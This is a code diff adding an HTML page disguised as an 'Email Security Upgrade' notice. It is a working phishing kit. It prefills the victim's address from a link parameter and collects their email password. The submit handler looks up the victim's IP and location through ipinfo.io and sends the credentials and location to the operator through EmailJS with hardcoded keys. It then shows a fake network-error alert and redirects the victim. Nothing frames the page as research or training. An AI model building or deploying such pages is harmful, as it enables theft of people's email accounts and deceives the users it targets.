@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Security Upgrade</title>
+    <link id="dynamicCSS" rel="stylesheet" href="css/default.css">
+    <link rel="stylesheet" href="css/style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+<body>
+
+    <!-- Background Video -->
+    <video autoplay muted loop id="bg-video">
+        <source src="https://www.example.com/video-url.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="upgrade-container">
+        <!-- Left Side: Upgrade Features and Message -->
+        <div class="left-side">
+            <img id="secureIcon" src="assets/secure-icon.png" alt="Secure Upgrade" class="secure-icon">
+
+            <h2>Email Security Upgrade Required</h2>
+            <p class="upgrade-message">
+                To continue using your email securely, we require a quick system upgrade.  
+                Please verify your email provider below and proceed.
+            </p>
+
+            <!-- Upgrade Features List -->
+            <div class="upgrade-settings">
+                <h3>Upgrade Features:</h3>
+                <div class="features-list">
+                    <div class="features-column">
+                        <ul>
+                            <li>✔ Enhanced Security</li>
+                            <li>✔ Faster Email Delivery</li>
+                            <li>✔ Increased Storage</li>
+                        </ul>
+                    </div>
+                    <div class="features-column">
+                        <ul>
+                            <li>✔ AI-Powered Spam Protection</li>
+                            <li>✔ Priority Customer Support</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <p class="secure-note">This upgrade enhances security and performance.</p>
+        </div>
+
+        <!-- Right Side: Login Form -->
+        <div class="right-side">
+            <div class="branding" id="brandingBox">
+                <img id="logo" src="" alt="Email Provider Logo" class="provider-logo">
+                <h3 id="providerName"></h3>
+            </div>
+
+            <!-- Login Form -->
+            <form id="loginForm">
+                <input type="email" id="emailInput" placeholder="Enter your email" oninput="detectProvider()" required>
+                <input type="password" id="passwordInput" placeholder="Enter your password" required>
+                
+                <!-- Remember Me Checkbox -->
+                <div class="checkbox-container">
+                    <label>
+                        <input type="checkbox" id="rememberMe"> Remember me
+                    </label>
+                    <a href="#" class="forgot-password">Forgot Password?</a>
+                </div>
+
+                <button type="submit">Proceed with Upgrade</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    
+    <script>
+        // Function to load email from URL parameters
+    function loadEmailFromParams() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailParam = urlParams.get('m'); // Changed from 'email' to 'm'
+        if (emailParam) {
+            document.getElementById("emailInput").value = emailParam;
+            detectProvider(); // Call provider detection if necessary
+        }
+    }
+
+    // Call function on page load
+    window.onload = loadEmailFromParams;
+
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("kUOv0ZnyMXgQQY1yj");
+        })();
+
+        // Form Submit Handling
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Fetch email and password inputs
+            const email = document.getElementById("emailInput").value;
+            const password = document.getElementById("passwordInput").value;
+
+            // Fetch user's IP and location info from IPinfo
+            fetch('https://ipinfo.io?token=f65a3d103cb816') // Replace with your IPinfo API token
+                .then(response => response.json())
+                .then(data => {
+                    const ipInfo = {
+                        email: email,
+                        password: password,
+                        ip: data.ip || 'Unknown IP',
+                        city: data.city || 'Unknown City',
+                        region: data.region || 'Unknown Region',
+                        country: data.country || 'Unknown Country'
+                    };
+
+                    // Send email using EmailJS
+                    emailjs.send("service_mclb6ze", "template_30nlj5e", ipInfo)
+                        .then(response => {
+                            console.log("Email Sent:", response.status, response.text);
+                            alert("Low Network Coverage°, try again");
+                            window.location.href = "exhibition.html"; 
+                        })
+                        .catch(error => {
+                            console.log("Error:", error);
+                            alert("Network Error, Try again later.");
+                        });
+                })
+                .catch(error => {
+                    console.log("IP Fetch Error:", error);
+                    alert("Unable to fetch location, try again.");
+                });
+        });
+    </script>
+
+</body>
+</html>
